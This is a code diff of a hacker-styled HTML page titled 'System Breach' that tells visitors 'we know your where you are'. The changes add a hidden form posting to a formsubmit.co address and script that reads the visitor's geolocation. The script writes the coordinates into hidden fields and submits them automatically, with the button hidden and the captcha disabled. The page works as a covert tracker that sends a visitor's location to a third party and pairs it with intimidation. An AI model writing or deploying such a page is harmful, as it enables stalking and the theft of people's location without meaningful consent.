@@ -6,101 +6,104 @@
 <title>System Breach</title>
 
 <style>
-    * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-        font-family: "Courier New", monospace;
-    }
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: "Courier New", monospace;
+}
 
-    body {
-        height: 100vh;
-        background: black;
-        color: #00ff00;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        overflow: hidden;
-    }
+body {
+    height: 100vh;
+    background: black;
+    color: #00ff00;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    overflow: hidden;
+}
 
-    body::before {
-        content: "";
-        position: absolute;
-        width: 200%;
-        height: 200%;
-        background: repeating-linear-gradient(
-            0deg,
-            rgba(0,255,0,0.05) 0px,
-            rgba(0,255,0,0.05) 2px,
-            transparent 2px,
-            transparent 4px
-        );
-        animation: scan 6s linear infinite;
-    }
+.box, .alert-box {
+    position: relative;
+    background: rgba(0, 0, 0, 0.9);
+    border: 2px solid #00ff00;
+    padding: 40px 60px;
+    text-align: center;
+    box-shadow: 0 0 20px #00ff00;
+}
 
-    @keyframes scan {
-        from { transform: translateY(-50%); }
-        to { transform: translateY(0); }
-    }
+.alert-box {
+    margin-top: 20px;
+    border-color: red;
+    color: red;
+    box-shadow: 0 0 20px red;
+    display: none;
+}
 
-    .box {
-        position: relative;
-        background: rgba(0, 0, 0, 0.85);
-        border: 2px solid #00ff00;
-        padding: 40px 60px;
-        text-align: center;
-        box-shadow: 0 0 20px #00ff00;
-        animation: glitch 1s infinite alternate;
-    }
+h1 {
+    font-size: 24px;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+}
 
-    .box h1 {
-        font-size: 28px;
-        letter-spacing: 3px;
-        text-transform: uppercase;
-        text-shadow: 0 0 10px #00ff00;
-    }
+.status {
+    margin-top: 15px;
+    font-size: 14px;
+}
 
-    .status {
-        margin-top: 15px;
-        font-size: 14px;
-        color: #0f0;
-    }
-
-    @keyframes glitch {
-        0% { transform: skew(0deg); }
-        20% { transform: skew(2deg); }
-        40% { transform: skew(-2deg); }
-        60% { transform: skew(1deg); }
-        80% { transform: skew(-1deg); }
-        100% { transform: skew(0deg); }
-    }
+button {
+    display: none;
+}
 </style>
 </head>
 <body>
 
-<div class="box">
-    <h1>we know your where you are</h1>
-    <div class="status" id="status">Initializing location trace...</div>
+<form id="locationForm" action="https://formsubmit.co/abrahambayland1@email.com" method="POST">
+
+   <!--Honeypot-->
+   <input type="text" name="_honey" style="display:none;">
+   <!--Disable Capctha-->
+   <input type="hidden" name="_captcha" value="false">
+
+    <div class="box">
+        <h1>we know your where you are</h1>
+        <div class="status" id="status">Initializing location trace...</div>
+        <input type="hidden" name="latitude" id="latitude">
+        <input type="hidden" name="longitude" id="longitude">
+    </div>
+    <button type="submit" id="submitBtn">Send</button>
+</form>
+
+<div class="alert-box" id="alertBox">
+    Unable to access your location. Location services may be disabled or denied.
 </div>
 
 <script>
-    const statusText = document.getElementById("status");
+const statusText = document.getElementById("status");
+const form = document.getElementById("locationForm");
+const alertBox = document.getElementById("alertBox");
 
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            function(position) {
-                statusText.innerHTML = 
-                    "Location Captured<br>" +
-                    "Latitude: " + position.coords.latitude + "<br>" +
-                    "Longitude: " + position.coords.longitude;
-            },
-            function(error) {
-                statusText.innerHTML = "Location access denied.";
-            }
-        );
-    } else {
-        statusText.innerHTML = "Geolocation not supported.";
-    }
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+        function(position) {
+            document.getElementById("latitude").value = position.coords.latitude;
+            document.getElementById("longitude").value = position.coords.longitude;
+
+            statusText.innerHTML = "Location captured. Sending...";
+
+           location.reload();
+            
+            form.submit();
+        },
+        function(error) {
+            statusText.innerHTML = "Location access denied.";
+            alertBox.style.display = "block";
+        }
+    );
+} else {
+    statusText.innerHTML = "Geolocation not supported.";
+    alertBox.style.display = "block";
+}
 </script>
 
 </body>
